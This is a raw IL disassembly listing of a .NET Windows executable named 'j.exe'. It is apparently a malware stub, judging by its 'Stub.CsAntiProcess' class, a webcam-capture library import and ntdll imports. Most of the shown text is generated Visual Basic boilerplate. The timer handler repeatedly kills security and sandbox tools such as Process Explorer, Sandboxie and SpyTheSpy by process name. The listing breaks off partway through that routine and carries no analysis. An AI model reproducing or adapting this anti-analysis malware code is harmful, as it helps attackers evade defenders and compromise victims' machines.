
//  Microsoft (R) .NET Framework IL Disassembler.  Version 4.0.30319.17929
//  Copyright (c) Microsoft Corporation.  All rights reserved.



// Metadata version: v2.0.50727
.module extern user32
.module extern user32.dll
.module extern kernel32.dll
.module extern winmm.dll
.module extern shell32.dll
.module extern kernel32
.module extern ntdll.dll
.module extern ntdll
.module extern avicap32.dll
.module extern User32
.assembly extern mscorlib
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly extern Microsoft.VisualBasic
{
  .publickeytoken = (B0 3F 5F 7F 11 D5 0A 3A )                         // .?_....:
  .ver 8:0:0:0
}
.assembly extern System
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly extern System.Drawing
{
  .publickeytoken = (B0 3F 5F 7F 11 D5 0A 3A )                         // .?_....:
  .ver 2:0:0:0
}
.assembly extern System.Windows.Forms
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly j
{
  .custom instance void [mscorlib]System.Reflection.AssemblyProductAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyTitleAttribute::.ctor(string) = ( 01 00 00 00 00 ) 

  // --- The following custom attribute is added automatically, do not uncomment -------
  //  .custom instance void [mscorlib]System.Diagnostics.DebuggableAttribute::.ctor(valuetype [mscorlib]System.Diagnostics.DebuggableAttribute/DebuggingModes) = ( 01 00 07 01 00 00 00 00 ) 

  .custom instance void [mscorlib]System.Reflection.AssemblyCopyrightAttribute::.ctor(string) = ( 01 00 12 43 6F 70 79 72 69 67 68 74 20 C2 A9 20   // ...Copyright .. 
                                                                                                  20 32 30 31 37 00 00 )                            //  2017..
  .custom instance void [mscorlib]System.Reflection.AssemblyCompanyAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyDescriptionAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilationRelaxationsAttribute::.ctor(int32) = ( 01 00 08 00 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.CompilerServices.RuntimeCompatibilityAttribute::.ctor() = ( 01 00 01 00 54 02 16 57 72 61 70 4E 6F 6E 45 78   // ....T..WrapNonEx
                                                                                                             63 65 70 74 69 6F 6E 54 68 72 6F 77 73 01 )       // ceptionThrows.
  .custom instance void [mscorlib]System.Reflection.AssemblyFileVersionAttribute::.ctor(string) = ( 01 00 07 30 2E 30 2E 30 2E 30 00 00 )             // ...0.0.0.0..
  .custom instance void [mscorlib]System.Runtime.InteropServices.GuidAttribute::.ctor(string) = ( 01 00 24 35 30 31 36 35 37 31 63 2D 33 36 33 39   // ..$5016571c-3639
                                                                                                  2D 34 39 62 34 2D 62 32 64 35 2D 65 38 37 30 35   // -49b4-b2d5-e8705
                                                                                                  66 64 39 35 61 31 31 00 00 )                      // fd95a11..
  .custom instance void [mscorlib]System.Runtime.InteropServices.ComVisibleAttribute::.ctor(bool) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyTrademarkAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .hash algorithm 0x00008004
  .ver 0:0:0:0
}
.module j.exe
// MVID: {C5DB8BC0-5AD0-416C-B091-3BB71ED8F92E}
.imagebase 0x00400000
.file alignment 0x00000200
.stackreserve 0x00100000
.subsystem 0x0002       // WINDOWS_GUI
.corflags 0x00000001    //  ILONLY
// Image base: 0x01480000


// =============== CLASS MEMBERS DECLARATION ===================

.class private auto ansi My.MyApplication
       extends [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.ApplicationBase
{
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 07 38 2E   // ...MyTemplate.8.
                                                                                                  30 2E 30 2E 30 00 00 )                            // 0.0.0..
  .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerNonUserCodeAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       9 (0x9)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.ApplicationBase::.ctor()
    IL_0006:  nop
    IL_0007:  nop
    IL_0008:  ret
  } // end of method MyApplication::.ctor

} // end of class My.MyApplication

.class private auto ansi My.MyComputer
       extends [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer
{
  .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 07 38 2E   // ...MyTemplate.8.
                                                                                                  30 2E 30 2E 30 00 00 )                            // 0.0.0..
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
    // Code size       10 (0xa)
    .maxstack  8
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  call       instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::.ctor()
    IL_0007:  nop
    IL_0008:  nop
    IL_0009:  ret
  } // end of method MyComputer::.ctor

} // end of class My.MyComputer

.class private auto ansi sealed beforefieldinit My.MyProject
       extends [mscorlib]System.Object
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 07 38 2E   // ...MyTemplate.8.
                                                                                                  30 2E 30 2E 30 00 00 )                            // 0.0.0..
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.HideModuleNameAttribute::.ctor() = ( 01 00 00 00 ) 
  .class auto ansi sealed nested assembly MyWebServices
         extends [mscorlib]System.Object
  {
    .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyGroupCollectionAttribute::.ctor(string,
                                                                                                         string,
                                                                                                         string,
                                                                                                         string) = ( 01 00 34 53 79 73 74 65 6D 2E 57 65 62 2E 53 65   // ..4System.Web.Se
                                                                                                                     72 76 69 63 65 73 2E 50 72 6F 74 6F 63 6F 6C 73   // rvices.Protocols
                                                                                                                     2E 53 6F 61 70 48 74 74 70 43 6C 69 65 6E 74 50   // .SoapHttpClientP
                                                                                                                     72 6F 74 6F 63 6F 6C 12 43 72 65 61 74 65 5F 5F   // rotocol.Create__
                                                                                                                     49 6E 73 74 61 6E 63 65 5F 5F 13 44 69 73 70 6F   // Instance__.Dispo
                                                                                                                     73 65 5F 5F 49 6E 73 74 61 6E 63 65 5F 5F 00 00   // se__Instance__..
                                                                                                                     00 ) 
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
    .method public strict virtual instance bool 
            Equals(object o) cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       18 (0x12)
      .maxstack  2
      .locals init (bool V_0)
      IL_0000:  nop
      IL_0001:  ldarg.0
      IL_0002:  ldarg.1
      IL_0003:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0008:  call       instance bool [mscorlib]System.Object::Equals(object)
      IL_000d:  stloc.0
      IL_000e:  br.s       IL_0010

      IL_0010:  ldloc.0
      IL_0011:  ret
    } // end of method MyWebServices::Equals

    .method public strict virtual instance int32 
            GetHashCode() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      // Code size       12 (0xc)
      .maxstack  1
      .locals init (int32 V_0)
      IL_0000:  nop
      IL_0001:  ldarg.0
      IL_0002:  call       instance int32 [mscorlib]System.Object::GetHashCode()
      IL_0007:  stloc.0
      IL_0008:  br.s       IL_000a

      IL_000a:  ldloc.0
      IL_000b:  ret
    } // end of method MyWebServices::GetHashCode

    .method assembly hidebysig instance class [mscorlib]System.Type 
            GetType() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      // Code size       16 (0x10)
      .maxstack  1
      .locals init (class [mscorlib]System.Type V_0)
      IL_0000:  nop
      IL_0001:  ldtoken    My.MyProject/MyWebServices
      IL_0006:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_000b:  stloc.0
      IL_000c:  br.s       IL_000e

      IL_000e:  ldloc.0
      IL_000f:  ret
    } // end of method MyWebServices::GetType

    .method public strict virtual instance string 
            ToString() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      // Code size       12 (0xc)
      .maxstack  1
      .locals init (string V_0)
      IL_0000:  nop
      IL_0001:  ldarg.0
      IL_0002:  call       instance string [mscorlib]System.Object::ToString()
      IL_0007:  stloc.0
      IL_0008:  br.s       IL_000a

      IL_000a:  ldloc.0
      IL_000b:  ret
    } // end of method MyWebServices::ToString

    .method private static !!T  Create__Instance__<.ctor T>(!!T 'instance') cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       32 (0x20)
      .maxstack  2
      .locals init (!!T V_0,
               bool V_1)
      IL_0000:  nop
      IL_0001:  ldarg.0
      IL_0002:  box        !!T
      IL_0007:  ldnull
      IL_0008:  ceq
      IL_000a:  stloc.1
      IL_000b:  ldloc.1
      IL_000c:  brfalse.s  IL_0018

      IL_000e:  call       !!0 [mscorlib]System.Activator::CreateInstance<!!0>()
      IL_0013:  stloc.0
      IL_0014:  br.s       IL_001e

      IL_0016:  br.s       IL_001d

      IL_0018:  nop
      IL_0019:  ldarg.0
      IL_001a:  stloc.0
      IL_001b:  br.s       IL_001e

      IL_001d:  nop
      IL_001e:  ldloc.0
      IL_001f:  ret
    } // end of method MyWebServices::Create__Instance__

    .method private instance void  Dispose__Instance__<T>(!!T& 'instance') cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       18 (0x12)
      .maxstack  2
      .locals init (!!T V_0)
      IL_0000:  nop
      IL_0001:  ldarg.1
      IL_0002:  ldloca.s   V_0
      IL_0004:  initobj    !!T
      IL_000a:  ldloc.0
      IL_000b:  stobj      !!T
      IL_0010:  nop
      IL_0011:  ret
    } // end of method MyWebServices::Dispose__Instance__

    .method public specialname rtspecialname 
            instance void  .ctor() cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       10 (0xa)
      .maxstack  8
      IL_0000:  nop
      IL_0001:  ldarg.0
      IL_0002:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0007:  nop
      IL_0008:  nop
      IL_0009:  ret
    } // end of method MyWebServices::.ctor

  } // end of class MyWebServices

  .class auto ansi sealed nested assembly ThreadSafeObjectProvider`1<.ctor T>
         extends [mscorlib]System.Object
  {
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
    .custom instance void [mscorlib]System.Runtime.InteropServices.ComVisibleAttribute::.ctor(bool) = ( 01 00 00 00 00 ) 
    .field private static !T m_ThreadStaticValue
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [mscorlib]System.ThreadStaticAttribute::.ctor() = ( 01 00 00 00 ) 
    .method assembly specialname instance !T 
            get_GetInstance() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       38 (0x26)
      .maxstack  2
      .locals init (!T V_0,
               bool V_1)
      IL_0000:  nop
      IL_0001:  ldsfld     !0 class My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue
      IL_0006:  box        !T
      IL_000b:  ldnull
      IL_000c:  ceq
      IL_000e:  stloc.1
      IL_000f:  ldloc.1
      IL_0010:  brfalse.s  IL_001c

      IL_0012:  call       !!0 [mscorlib]System.Activator::CreateInstance<!T>()
      IL_0017:  stsfld     !0 class My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue
      IL_001c:  ldsfld     !0 class My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue
      IL_0021:  stloc.0
      IL_0022:  br.s       IL_0024

      IL_0024:  ldloc.0
      IL_0025:  ret
    } // end of method ThreadSafeObjectProvider`1::get_GetInstance

    .method public specialname rtspecialname 
            instance void  .ctor() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      // Code size       10 (0xa)
      .maxstack  8
      IL_0000:  nop
      IL_0001:  ldarg.0
      IL_0002:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0007:  nop
      IL_0008:  nop
      IL_0009:  ret
    } // end of method ThreadSafeObjectProvider`1::.ctor

    .property instance !T GetInstance()
    {
      .get instance !T My.MyProject/ThreadSafeObjectProvider`1::get_GetInstance()
    } // end of property ThreadSafeObjectProvider`1::GetInstance
  } // end of class ThreadSafeObjectProvider`1

  .field private static initonly class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer> m_ComputerObjectProvider
  .field private static initonly class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication> m_AppObjectProvider
  .field private static initonly class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> m_UserObjectProvider
  .field private static initonly class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices> m_MyWebServicesObjectProvider
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerNonUserCodeAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       42 (0x2a)
    .maxstack  8
    IL_0000:  newobj     instance void class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer>::.ctor()
    IL_0005:  stsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer> My.MyProject::m_ComputerObjectProvider
    IL_000a:  newobj     instance void class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication>::.ctor()
    IL_000f:  stsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication> My.MyProject::m_AppObjectProvider
    IL_0014:  newobj     instance void class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User>::.ctor()
    IL_0019:  stsfld     class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> My.MyProject::m_UserObjectProvider
    IL_001e:  newobj     instance void class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices>::.ctor()
    IL_0023:  stsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices> My.MyProject::m_MyWebServicesObjectProvider
    IL_0028:  nop
    IL_0029:  ret
  } // end of method MyProject::.cctor

  .method assembly specialname static class My.MyComputer 
          get_Computer() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       16 (0x10)
    .maxstack  1
    .locals init (class My.MyComputer V_0)
    IL_0000:  nop
    IL_0001:  ldsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer> My.MyProject::m_ComputerObjectProvider
    IL_0006:  callvirt   instance !0 class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer>::get_GetInstance()
    IL_000b:  stloc.0
    IL_000c:  br.s       IL_000e

    IL_000e:  ldloc.0
    IL_000f:  ret
  } // end of method MyProject::get_Computer

  .method assembly specialname static class My.MyApplication 
          get_Application() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       16 (0x10)
    .maxstack  1
    .locals init (class My.MyApplication V_0)
    IL_0000:  nop
    IL_0001:  ldsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication> My.MyProject::m_AppObjectProvider
    IL_0006:  callvirt   instance !0 class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication>::get_GetInstance()
    IL_000b:  stloc.0
    IL_000c:  br.s       IL_000e

    IL_000e:  ldloc.0
    IL_000f:  ret
  } // end of method MyProject::get_Application

  .method assembly specialname static class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User 
          get_User() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       16 (0x10)
    .maxstack  1
    .locals init (class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User V_0)
    IL_0000:  nop
    IL_0001:  ldsfld     class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> My.MyProject::m_UserObjectProvider
    IL_0006:  callvirt   instance !0 class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User>::get_GetInstance()
    IL_000b:  stloc.0
    IL_000c:  br.s       IL_000e

    IL_000e:  ldloc.0
    IL_000f:  ret
  } // end of method MyProject::get_User

  .method assembly specialname static class My.MyProject/MyWebServices 
          get_WebServices() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       16 (0x10)
    .maxstack  1
    .locals init (class My.MyProject/MyWebServices V_0)
    IL_0000:  nop
    IL_0001:  ldsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices> My.MyProject::m_MyWebServicesObjectProvider
    IL_0006:  callvirt   instance !0 class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices>::get_GetInstance()
    IL_000b:  stloc.0
    IL_000c:  br.s       IL_000e

    IL_000e:  ldloc.0
    IL_000f:  ret
  } // end of method MyProject::get_WebServices

  .property class My.MyComputer Computer()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0B 4D 79 2E 43 6F 6D 70 75 74 65 72 00 00 ) // ...My.Computer..
    .get class My.MyComputer My.MyProject::get_Computer()
  } // end of property MyProject::Computer
  .property class My.MyApplication Application()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0E 4D 79 2E 41 70 70 6C 69 63 61 74 69 6F   // ...My.Applicatio
                                                                                                       6E 00 00 )                                        // n..
    .get class My.MyApplication My.MyProject::get_Application()
  } // end of property MyProject::Application
  .property class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User
          User()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 07 4D 79 2E 55 73 65 72 00 00 )             // ...My.User..
    .get class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User My.MyProject::get_User()
  } // end of property MyProject::User
  .property class My.MyProject/MyWebServices
          WebServices()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0E 4D 79 2E 57 65 62 53 65 72 76 69 63 65   // ...My.WebService
                                                                                                       73 00 00 )                                        // s..
    .get class My.MyProject/MyWebServices My.MyProject::get_WebServices()
  } // end of property MyProject::WebServices
} // end of class My.MyProject

.class private auto ansi _Object
       extends [mscorlib]System.Exception
{
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerNonUserCodeAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       9 (0x9)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Exception::.ctor()
    IL_0006:  nop
    IL_0007:  nop
    IL_0008:  ret
  } // end of method _Object::.ctor

} // end of class _Object

.class public auto ansi j.A
       extends [mscorlib]System.Object
{
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerNonUserCodeAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       9 (0x9)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  nop
    IL_0007:  nop
    IL_0008:  ret
  } // end of method A::.ctor

  .method public static void  main() cil managed
  {
    .entrypoint
    .custom instance void [mscorlib]System.STAThreadAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       9 (0x9)
    .maxstack  8
    IL_0000:  nop
    IL_0001:  call       void j.OK::ko()
    IL_0006:  nop
    IL_0007:  nop
    IL_0008:  ret
  } // end of method A::main

} // end of class j.A

.class public auto ansi beforefieldinit Stub.CsAntiProcess
       extends [mscorlib]System.Object
{
  .field private static class [System]System.Timers.Timer Timer
  .field private static class j.OK N
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       12 (0xc)
    .maxstack  8
    IL_0000:  newobj     instance void j.OK::.ctor()
    IL_0005:  stsfld     class j.OK Stub.CsAntiProcess::N
    IL_000a:  nop
    IL_000b:  ret
  } // end of method CsAntiProcess::.cctor

  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerNonUserCodeAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       9 (0x9)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  nop
    IL_0007:  nop
    IL_0008:  ret
  } // end of method CsAntiProcess::.ctor

  .method public static void  Handler(object sender,
                                      class [System]System.Timers.ElapsedEventArgs e) cil managed
  {
    // Code size       1532 (0x5fc)
    .maxstack  2
    .locals init (class [System]System.Diagnostics.Process V_0,
             class [System]System.Diagnostics.Process V_1,
             class [System]System.Diagnostics.Process V_2,
             class [System]System.Diagnostics.Process V_3,
             class [System]System.Diagnostics.Process V_4,
             class [System]System.Diagnostics.Process V_5,
             class [System]System.Diagnostics.Process V_6,
             class [System]System.Diagnostics.Process V_7,
             class [System]System.Diagnostics.Process V_8,
             class [System]System.Diagnostics.Process V_9,
             class [System]System.Diagnostics.Process V_10,
             class [System]System.Diagnostics.Process V_11,
             class [System]System.Diagnostics.Process V_12,
             class [System]System.Diagnostics.Process V_13,
             class [System]System.Diagnostics.Process V_14,
             class [System]System.Diagnostics.Process V_15,
             class [System]System.Diagnostics.Process V_16,
             class [System]System.Diagnostics.Process V_17,
             class [System]System.Diagnostics.Process V_18,
             class [System]System.Diagnostics.Process V_19,
             class [System]System.Diagnostics.Process V_20,
             class [System]System.Diagnostics.Process V_21,
             class [System]System.Diagnostics.Process V_22,
             class [System]System.Diagnostics.Process V_23,
             class [System]System.Diagnostics.Process V_24,
             class [System]System.Diagnostics.Process V_25,
             class [System]System.Diagnostics.Process V_26,
             class [System]System.Diagnostics.Process V_27,
             class [System]System.Diagnostics.Process V_28,
             int32 V_29,
             class [System]System.Diagnostics.Process[] V_30,
             int32 V_31,
             class [System]System.Diagnostics.Process[] V_32,
             int32 V_33,
             class [System]System.Diagnostics.Process[] V_34,
             int32 V_35,
             class [System]System.Diagnostics.Process[] V_36,
             int32 V_37,
             class [System]System.Diagnostics.Process[] V_38,
             int32 V_39,
             class [System]System.Diagnostics.Process[] V_40,
             int32 V_41,
             class [System]System.Diagnostics.Process[] V_42,
             int32 V_43,
             class [System]System.Diagnostics.Process[] V_44,
             int32 V_45,
             class [System]System.Diagnostics.Process[] V_46,
             int32 V_47,
             class [System]System.Diagnostics.Process[] V_48,
             int32 V_49,
             class [System]System.Diagnostics.Process[] V_50,
             int32 V_51,
             class [System]System.Diagnostics.Process[] V_52,
             int32 V_53,
             class [System]System.Diagnostics.Process[] V_54,
             int32 V_55,
             class [System]System.Diagnostics.Process[] V_56,
             int32 V_57,
             class [System]System.Diagnostics.Process[] V_58,
             int32 V_59,
             class [System]System.Diagnostics.Process[] V_60,
             int32 V_61,
             class [System]System.Diagnostics.Process[] V_62,
             int32 V_63,
             class [System]System.Diagnostics.Process[] V_64,
             int32 V_65,
             class [System]System.Diagnostics.Process[] V_66,
             int32 V_67,
             class [System]System.Diagnostics.Process[] V_68,
             int32 V_69,
             class [System]System.Diagnostics.Process[] V_70,
             int32 V_71,
             class [System]System.Diagnostics.Process[] V_72,
             int32 V_73,
             class [System]System.Diagnostics.Process[] V_74,
             int32 V_75,
             class [System]System.Diagnostics.Process[] V_76,
             int32 V_77,
             class [System]System.Diagnostics.Process[] V_78,
             int32 V_79,
             class [System]System.Diagnostics.Process[] V_80,
             int32 V_81,
             class [System]System.Diagnostics.Process[] V_82,
             int32 V_83,
             class [System]System.Diagnostics.Process[] V_84,
             int32 V_85,
             class [System]System.Diagnostics.Process[] V_86,
             bool V_87)
    IL_0000:  nop
    IL_0001:  ldstr      "procexp"
    IL_0006:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_000b:  stloc.s    V_30
    IL_000d:  ldc.i4.0
    IL_000e:  stloc.s    V_29
    IL_0010:  br.s       IL_0026

    IL_0012:  ldloc.s    V_30
    IL_0014:  ldloc.s    V_29
    IL_0016:  ldelem.ref
    IL_0017:  stloc.0
    IL_0018:  ldloc.0
    IL_0019:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
    IL_001e:  nop
    IL_001f:  ldloc.s    V_29
    IL_0021:  ldc.i4.1
    IL_0022:  add.ovf
    IL_0023:  stloc.s    V_29
    IL_0025:  nop
    IL_0026:  ldloc.s    V_29
    IL_0028:  ldloc.s    V_30
    IL_002a:  ldlen
    IL_002b:  conv.ovf.i4
    IL_002c:  clt
    IL_002e:  stloc.s    V_87
    IL_0030:  ldloc.s    V_87
    IL_0032:  brtrue.s   IL_0012

    IL_0034:  ldstr      "SbieCtrl"
    IL_0039:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_003e:  stloc.s    V_32
    IL_0040:  ldc.i4.0
    IL_0041:  stloc.s    V_31
    IL_0043:  br.s       IL_005b

    IL_0045:  ldloc.s    V_32
    IL_0047:  ldloc.s    V_31
    IL_0049:  ldelem.ref
    IL_004a:  stloc.s    V_11
    IL_004c:  ldloc.s    V_11
    IL_004e:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
    IL_0053:  nop
    IL_0054:  ldloc.s    V_31
    IL_0056:  ldc.i4.1
    IL_0057:  add.ovf
    IL_0058:  stloc.s    V_31
    IL_005a:  nop
    IL_005b:  ldloc.s    V_31
    IL_005d:  ldloc.s    V_32
    IL_005f:  ldlen
    IL_0060:  conv.ovf.i4
    IL_0061:  clt
    IL_0063:  stloc.s    V_87
    IL_0065:  ldloc.s    V_87
    IL_0067:  brtrue.s   IL_0045

    IL_0069:  ldstr      "SpyTheSpy"
    IL_006e:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_0073:  stloc.s    V_34
    IL_0075:  ldc.i4.0
    IL_0076:  stloc.s    V_33
    IL_0078:  br.s       IL_0090

    IL_007a:  ldloc.s    V_34
    IL_007c:  ldloc.s    V_33
    IL_007e:  ldelem.ref
    IL_007f:  stloc.s    V_22
    IL_0081:  ldloc.s    V_22
